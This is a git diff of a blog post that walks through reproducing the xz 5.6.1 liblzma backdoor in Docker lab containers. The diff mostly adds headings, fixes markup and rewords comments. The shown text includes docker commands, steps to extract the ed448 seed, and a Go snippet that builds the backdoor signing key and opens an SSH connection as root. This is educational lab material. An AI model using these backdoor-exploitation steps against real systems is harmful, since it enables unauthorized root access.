@@ -80,6 +80,8 @@ cd xz-5.6.1-backdoor
 git submodule update --init --recursive
 ```
 
+### Running the containers 
+
 Now, you should be in the [`xz-5.6.1-backdoor`](https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor) folder.
 
 Then, start the vulnerable server in the background.
@@ -96,6 +98,8 @@ This will create two networked containers:
 
 This will take care of ensuring that we download and set up the correct versions of `xz` and `liblzma`. Note the vulnerable `.deb` for `liblzma` [is in Davide's repo](https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/deb/liblzma5_5.6.1-1_amd64.deb).
 
+### Executing the attack
+
 Davide's has listed instructions on [how to execute the backdoor](https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/README.md) via docker compose, but I have modified these instructions slightly to work from within the bash prompt of the docker instance.
 
 ```bash
@@ -106,9 +110,10 @@ docker exec -it xzbackdoor-poc bash
 
 From here, we can attack the system as if we were running commands on it normally.
 
-> The ed448 key pair is generated from a random seed. Info on the key and its seed are printed out and stored in /exploit/ed448info.txt
+> [Note:](https://github.com/dguerri/exploits-collection/blob/main/xz-5.6.1-backdoor/README.md)
+> The ed448 key pair is generated from a random seed. Info on the key and its seed are printed out and stored in `/exploit/ed448info.txt`
 
-We want to get the seed that it randomly generated. In the real world, this is reminiscent of the private key that only the original creators of the exploit have.
+We want to get the seed that it randomly generated during setup. In the real world, this is reminiscent of the private key that only the original creators of the exploit have.
 
 ```bash
 # this extracts the seed from the information printed during the challenge setup
@@ -144,7 +149,8 @@ Usage of /exploit/xzbot/xzbot:
 Note the output of this should end with "ssh: handshake failed: EOF". This is normal.
 
 <aside>
-<deatils>
+
+<details>
 
 <summary>See expected output</summary>
 
@@ -225,7 +231,7 @@ Nope! It's just establishing the SSH connection with the appropriate key!
 
 ```go
 	// ...
-	signingKey := ed448.NewKeyFromSeed(seed[:])     // create key from same seed as in vulnerable system
+	signingKey := ed448.NewKeyFromSeed(seed[:])     // creates a key from same seed as in vulnerable system
 	xz := &xzSigner{                                // xzSigner takes a signing key and generates the appropriate public key
 		signingKey:    signingKey,                  
 		encryptionKey: signingKey[ed448.SeedSize:],
@@ -233,8 +239,8 @@ Nope! It's just establishing the SSH connection with the appropriate key!
 	// this creates an SSH client as the root user
 	config := &ssh.ClientConfig{
 		User: "root",
-		Auth: []ssh.AuthMethod{                     // establishes the authentication method using the secret private key
-			ssh.PublicKeys(xz),
+		Auth: []ssh.AuthMethod{                     // Establishes the authentication method using the public
+			ssh.PublicKeys(xz),                     //   key generated from the initial signing key and seed.
 		},
 		HostKeyCallback: xz.HostKeyCallback,        // takes the SSH public key and computes a hash
 	}
@@ -256,6 +262,19 @@ TODO
 
 I consulted a bunch of resources when building this list.
 Here's a compilation of the resources I found to be helpful, with the date they were first posted.
+
+<!-- make list of links easier to read -->
+<style>
+section#further-reading li, 
+section#further-reading p {
+    line-height: 1em;
+    text-decoration: none;
+    margin: 0;
+    padding: 0;
+}
+</style>
+
+<section id="further-reading">
 
 - xzbot: <https://github.com/amlweems/xzbot>
     - Credit: Anthony Weems [GitHub](https://github.com/amlweems), [Mastodon](https://infosec.exchange/@amlw)
@@ -287,4 +306,6 @@ Here's a compilation of the resources I found to be helpful, with the date they 
 - ["reflections on distrusting xz"](https://joeyh.name/blog/entry/reflections_on_distrusting_xz/) (2024-04-03)
 - [Low Level Learning - "revealing the features of the XZ backdoor"](https://youtu.be/vV_WdTBbww4) (2024-04-03)
 
+
+</section>
 
